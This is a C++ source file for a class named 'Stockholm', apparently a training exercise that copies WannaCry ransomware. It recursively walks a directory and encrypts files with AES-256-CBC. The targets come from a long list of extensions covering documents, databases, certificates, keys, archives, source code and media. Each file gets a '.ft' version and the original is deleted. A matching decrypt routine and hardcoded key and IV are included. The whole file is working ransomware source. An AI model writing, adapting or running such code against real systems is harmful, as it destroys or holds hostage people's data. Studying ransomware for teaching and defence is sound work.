#include "../../include/class/Stockholm.hpp"

Stockholm::Stockholm()
    : _root(DEFAULT_ROOT),
      _key(this->_set_key()),
      _iv(this->_set_iv())
{
}

Stockholm::Stockholm(const Stockholm &other)
    : _root(other._root),
      _key(other._key),
      _iv(other._iv)
{
}

Stockholm::Stockholm(const std::string *root, const std::string *key, const std::string *iv)
    : _root(root ? *root : DEFAULT_ROOT),
      _key(key ? *key : this->_set_key()),
      _iv(iv ? *iv : this->_set_iv())
{
}

Stockholm::~Stockholm()
{
}

Stockholm &Stockholm::operator=(const Stockholm &other)
{
        if (this != &other)
        {
                this->_root = other._root;
                this->_key = other._key;
                this->_iv = other._iv;
        }
        return *this;
}

const std::string &Stockholm::get_root() const
{
        return this->_root;
}

const std::string &Stockholm::get_key() const
{
        return this->_key;
}

const std::string &Stockholm::get_iv() const
{
        return this->_iv;
}

const std::array<std::string, EXT_COUNT> &Stockholm::get_target_ext() const
{
        return Stockholm::_target_ext;
}

void Stockholm::set_root(const std::string &root)
{
        this->_root = root;
}

void Stockholm::set_key(const std::string &key)
{
        this->_key = key;
}

void Stockholm::set_iv(const std::string &iv)
{
        this->_iv = iv;
}

void Stockholm::print_version() const
{
        std::cout << "Version " << VERSION << std::endl;
}

void Stockholm::print_target_ext() const
{
        for (const std::string &ext : Stockholm::_target_ext)
                std::cout << ext << std::endl;
}

void Stockholm::encrypt(const bool verbose) const
{
        this->_crypt(this->_root, true, verbose);
}

void Stockholm::decrypt(const bool verbose) const
{
        this->_crypt(this->_root, false, verbose);
}

std::string Stockholm::_set_key()
{
        return "0123456789012345";
}

std::string Stockholm::_set_iv()
{
        return "abcdefghijklmnop";
}

void Stockholm::_crypt(const std::string &workdir, const bool encrypt, const bool verbose) const
{
        DIR *dir;
        struct dirent *ent;
        struct stat s;

        if (!(dir = opendir(workdir.c_str())))
        {
                std::cerr << "[ERROR] Can't open " << workdir << ": ";
                perror(NULL);
                std::cerr << std::endl;
                return;
        }
        while ((ent = readdir(dir)))
        {
                const std::string path = workdir + "/" + ent->d_name;

                if (stat(path.c_str(), &s) == 0 && S_ISDIR(s.st_mode))
                {
                        if (std::string(ent->d_name) != "." && std::string(ent->d_name) != "..")
                                this->_crypt(path, encrypt, verbose);
                        continue;
                }
                const std::string extension = path.substr(path.find_last_of(".") + 1);
                for (short i = 0; i < EXT_COUNT; ++i)
                {
                        if ((extension != "ft") && (extension != this->_target_ext[i]))
                                continue;
                        std::ifstream file(path.c_str());
                        if (!file.is_open())
                                continue;
                        try
                        {
                                if (encrypt && extension != "ft")
                                        this->_ssl_encrypt(file, path.c_str(), verbose);
                                else if (!encrypt && extension == "ft")
                                        this->_ssl_decrypt(file, path.c_str(), verbose);
                        }
                        catch (const std::exception &e)
                        {
                                if (verbose)
                                        std::cerr << "[ERROR] Stockholm::_crypt(): " << e.what() << std::endl;
                        }
                        break;
                }
        }
        closedir(dir);
}

void Stockholm::_ssl_encrypt(std::ifstream &file, const std::string &path, const bool verbose) const
{
        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (EVP_EncryptInit_ex(
                ctx,
                EVP_aes_256_cbc(),
                NULL,
                reinterpret_cast<const unsigned char *>(this->_key.c_str()),
                reinterpret_cast<const unsigned char *>(this->_iv.c_str())) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_EncryptInit_ex failed.");
        }

        std::vector<unsigned char> outbuf(buffer.size() + EVP_MAX_BLOCK_LENGTH);
        int outlen;
        int finaloutlen;
        if (EVP_EncryptUpdate(
                ctx,
                outbuf.data(),
                &outlen,
                reinterpret_cast<unsigned char *>(buffer.data()),
                buffer.size()) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_EncryptUpdate failed.");
        }
        if (EVP_EncryptFinal_ex(ctx, outbuf.data() + outlen, &finaloutlen) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_EncryptFinal_ex failed.");
        }

        const std::string outputPath = path + ".ft";
        std::ofstream output(outputPath, std::ios::binary | std::ios::trunc);
        output.write(reinterpret_cast<char *>(outbuf.data()), outlen + finaloutlen);
        output.close();
        std::remove(path.c_str());

        EVP_CIPHER_CTX_free(ctx);
        if (verbose)
                std::cout << path << " encrypted." << std::endl;
}

void Stockholm::_ssl_decrypt(std::ifstream &file, const std::string &path, const bool verbose) const
{
        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (EVP_DecryptInit_ex(
                ctx,
                EVP_aes_256_cbc(),
                NULL,
                reinterpret_cast<const unsigned char *>(this->_key.c_str()),
                reinterpret_cast<const unsigned char *>(this->_iv.c_str())) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_DecryptInit_ex failed.");
        }

        std::vector<unsigned char> outbuf(buffer.size() + EVP_MAX_BLOCK_LENGTH);
        int outlen;
        int finaloutlen;
        if (EVP_DecryptUpdate(
                ctx,
                outbuf.data(),
                &outlen,
                reinterpret_cast<unsigned char *>(buffer.data()),
                buffer.size()) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_DecryptUpdate failed.");
        }
        if (EVP_DecryptFinal_ex(ctx, outbuf.data() + outlen, &finaloutlen) != 1)
        {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("EVP_DecryptFinal_ex failed.");
        }

        const std::string outputPath = path.substr(0, path.find_last_of("."));
        std::ofstream output(outputPath, std::ios::binary | std::ios::trunc);
        output.write(reinterpret_cast<char *>(outbuf.data()), outlen + finaloutlen);
        output.close();
        std::remove(path.c_str());

        EVP_CIPHER_CTX_free(ctx);
        if (verbose)
                std::cout << path << " decrypted." << std::endl;
}

const std::array<std::string, EXT_COUNT> Stockholm::_target_ext = {
    "der",
    "pfx",
    "key",
    "crt",
    "csr",
    "p12",
    "pem",
    "odt",
    "ott",
    "sxw",
    "stw",
    "uot",
    "3ds",
    "max",
    "3dm",
    "ods",
    "ots",
    "sxc",
    "stc",
    "dif",
    "slk",
    "wb2",
    "odp",
    "otp",
    "sxd",
    "std",
    "uop",
    "odg",
    "otg",
    "sxm",
    "mml",
    "lay",
    "lay6",
    "asc",
    "sqlite3",
    "sqlitedb",
    "sql",
    "accdb",
    "mdb",
    "db",
    "dbf",
    "odb",
    "frm",
    "myd",
    "myi",
    "ibd",
    "mdf",
    "ldf",
    "sln",
    "suo",
    "cs",
    "c",
    "cpp",
    "pas",
    "h",
    "asm",
    "js",
    "cmd",
    "bat",
    "ps1",
    "vbs",
    "vb",
    "pl",
    "dip",
    "dch",
    "sch",
    "brd",
    "jsp",
    "php",
    "asp",
    "rb",
    "java",
    "jar",
    "class",
    "sh",
    "mp3",
    "wav",
    "swf",
    "fla",
    "wmv",
    "mpg",
    "vob",
    "mpeg",
    "asf",
    "avi",
    "mov",
    "mp4",
    "3gp",
    "mkv",
    "3g2",
    "flv",
    "wma",
    "mid",
    "m3u",
    "m4u",
    "djvu",
    "svg",
    "ai",
    "psd",
    "nef",
    "tiff",
    "tif",
    "cgm",
    "raw",
    "gif",
    "png",
    "bmp",
    "jpg",
    "jpeg",
    "vcd",
    "iso",
    "backup",
    "zip",
    "rar",
    "7z",
    "gz",
    "tgz",
    "tar",
    "bak",
    "tbk",
    "bz2",
    "PAQ",
    "ARC",
    "aes",
    "gpg",
    "vmx",
    "vmdk",
    "vdi",
    "sldm",
    "sldx",
    "sti",
    "sxi",
    "602",
    "hwp",
    "snt",
    "onetoc2",
    "dwg",
    "pdf",
    "wk1",
    "wks",
    "123",
    "rtf",
    "csv",
    "txt",
    "vsdx",
    "vsd",
    "edb",
    "eml",
    "msg",
    "ost",
    "pst",
    "potm",
    "potx",
    "ppam",
    "ppsx",
    "ppsm",
    "pps",
    "pot",
    "pptm",
    "pptx",
    "ppt",
    "xltm",
    "xltx",
    "xlc",
    "xlm",
    "xlt",
    "xlw",
    "xlsb",
    "xlsm",
    "xlsx",
    "xls",
    "dotx",
    "dotm",
    "dot",
    "docm",
    "docb",
    "docx",
    "doc",
};